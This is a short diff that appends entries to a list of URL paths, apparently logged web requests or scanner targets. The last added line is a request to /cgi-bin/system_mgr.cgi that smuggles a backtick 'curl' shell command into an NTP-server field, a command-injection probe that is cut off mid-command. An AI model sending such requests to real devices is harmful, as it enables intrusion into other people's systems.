@@ -9447,3 +9447,6 @@ a
 /wp-content/plugins/event-espresso-core-reg/readme.txt
 /?gad_source=5&gclid=EAIaIQobChMI9uCfkr7jigMVvJCDBx128CyAEAEYASAAEgK1M_D_BwE
 /?gad_source=5&gclid=EAIaIQobChMIno2a0r_jigMVsyz7Ax1G0A2cEAEYASAAEgJL1fD_BwE
+/cgi-bin/system_mgr.cgi
+/login.htm
+/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl
